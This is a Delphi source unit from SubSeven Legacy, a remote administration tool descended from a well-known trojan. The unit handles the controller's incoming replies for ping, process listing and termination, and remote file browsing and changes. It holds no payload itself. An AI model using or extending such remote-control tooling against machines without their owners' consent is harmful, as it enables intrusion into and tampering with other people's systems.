{******************************************************************************}
{                                                                              }
{         ____             _     ____          _           ____                }
{        |  _ \  __ _ _ __| | __/ ___|___   __| | ___ _ __/ ___|  ___          }
{        | | | |/ _` | '__| |/ / |   / _ \ / _` |/ _ \ '__\___ \ / __|         }
{        | |_| | (_| | |  |   <| |__| (_) | (_| |  __/ |   ___) | (__          }
{        |____/ \__,_|_|  |_|\_\\____\___/ \__,_|\___|_|  |____/ \___|         }
{                                                                              }
{                           +++++++++++++++++++++                              }
{                           +       +           +                              }
{                           +       +           +                              }
{                           +    +++++++++      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++      +      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++++++++++++++++                              }
{                                 SubSeven Legacy                              }
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/                                   }
{                   https://github.com/darkcodersc                             }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{  Disclaimer:                                                                 }
{  -----------                                                                 }
{    We are doing our best to prepare the content of this app and/or code.     }
{    However, The author cannot warranty the expressions and suggestions       }
{    of the contents, as well as its accuracy. In addition, to the extent      }
{    permitted by the law, author shall not be responsible for any losses      }
{    and/or damages due to the usage of the information on our app and/or      }
{    code.                                                                     }
{                                                                              }
{    By using our app and/or code, you hereby consent to our disclaimer        }
{    and agree to its terms.                                                   }
{                                                                              }
{    Any links contained in our app may lead to external sites are provided    }
{    for convenience only.                                                     }
{    Any information or statements that appeared in these sites or app or      }
{    files are not sponsored, endorsed, or otherwise approved by the author.   }
{    For these external sites, the author cannot be held liable for the        }
{    availability of, or the content located on or through it.                 }
{    Plus, any losses or damages occurred from using these contents or the     }
{    internet generally.                                                       }
{                                                                              }
{                                                                              }
{                                                                              }
{    I dedicate this work to my daughter.                                      }
{                                                                              }
{******************************************************************************}

unit Sub7.Thread.Net.Client.Session.Cmd;

interface

uses System.Classes, Sub7.Thread.Net.Client.Session, Sub7.Core.Protocol, XSuperObject;

type
  TSub7ClientSessionCmd = class(TSub7ClientSession)
  private
    {@M}
    procedure ShowSuccessMessage(const AData : ISuperObject);
    procedure RenderPing(const AData : ISuperObject);
  protected
    {@M}
    procedure OnBeforeCommandLoop(); override;
    procedure OnAfterCommandLoop(); override;
    procedure OnCommand(const ACommand : TS7Command; AData : ISuperObject = nil); override;
  end;

implementation

uses uFormMain, Sub7.Core.Exceptions, Sub7.Core.Bundle, System.SysUtils, uFormSockets, ___S7DockFrame,
     uFormFileManager, Sub7.Core.Types, ___S7ControlWindow,
     Sub7.Viewer.Types;

{-------------------------------------------------------------------------------
  Parse and show success message to main form
-------------------------------------------------------------------------------}
procedure TSub7ClientSessionCmd.ShowSuccessMessage(const AData : ISuperObject);
begin
  if not Assigned(AData) then
    Exit();

  if not AData.Contains('message') then
    Exit();

  SafeSynchronize(procedure begin
    FormMain.ShowSuccessMessage(AData.S['message']);
  end);
end;

{-------------------------------------------------------------------------------
  Render Ping
-------------------------------------------------------------------------------}
procedure TSub7ClientSessionCmd.RenderPing(const AData : ISuperObject);
var ATick : Int64;
begin
  if not Assigned(AData) then
    Exit();
  ///

  if not AData.Contains('tick') then
    raise ES7ParseException.Create(Format(ERR_MISSING_PARAMETER, ['tick']));

  ATick := AData.I['tick'];

  SafeSynchronize(procedure begin
    FormMain.SetStatus(Format('(%s) Ping value: %d Ms.', [TimeToStr(Now), GetTickCount() - ATick]));
  end);
end;

{-------------------------------------------------------------------------------

-------------------------------------------------------------------------------}
procedure TSub7ClientSessionCmd.OnBeforeCommandLoop();
begin
  inherited OnBeforeCommandLoop();
  ///

end;

{-------------------------------------------------------------------------------

-------------------------------------------------------------------------------}
procedure TSub7ClientSessionCmd.OnCommand(const ACommand : TS7Command; AData : ISuperObject = nil);
var ADockedFrame   : TS7FrameDock;
    AControlWindow : TS7ControlWindow;
begin
  inherited OnCommand(ACommand, AData);
  ///

  AControlWindow := nil;
  if AData.Contains('form_guid') then begin
    SafeSynchronize(procedure begin
      AControlWindow := FormMain.GetControlForm(AData.S['form_guid']);
    end);
    AData.Remove('form_guid');
  end;

  case ACommand of
    {
      Reply to Ping Request
    }
    mhcPong : begin
      self.RenderPing(AData);
    end;

    {
      Process Manager Render Commands
    }
    mhcProcessList, mhcTerminateProcess : begin
      SafeSynchronize(procedure begin
        ADockedFrame := FormMain.GetDockedFrame(nmProcessManager);
        if Assigned(ADockedFrame) then
          ADockedFrame.Render(ACommand, AData);
      end);
    end;

    {
      Show success message
    }
    mhcSuccess : begin
      self.ShowSuccessMessage(AData);
    end;

    {***************************************************************************
      File Manager
    ***************************************************************************}

    {
      @render: Refresh Hard Drives
    }
    fmcRefreshDrives : begin
      SafeSynchronize(procedure begin
        if Assigned(AControlWindow) then
          TFormFileManager(AControlWindow).RenderHardDrives(AData);
      end);
    end;

    {
      @render: Refresh Folders
    }
    fmcBrowseFolder : begin
      SafeSynchronize(procedure begin
        if Assigned(AControlWindow) then
          TFormFileManager(AControlWindow).RenderFolder(AData);
      end);
    end;

    {
      @Reactive Commands
    }
    fmcCreateFolder,
    fmcDeleteFile,
    fmcRenameFile : begin
      SafeSynchronize(procedure begin
        FormMain.ReactControlWindows(ACommand, AData);
      end);
    end;
  end;
end;

{-------------------------------------------------------------------------------

-------------------------------------------------------------------------------}
procedure TSub7ClientSessionCmd.OnAfterCommandLoop();
begin
  inherited OnAfterCommandLoop();
  ///

end;

end.
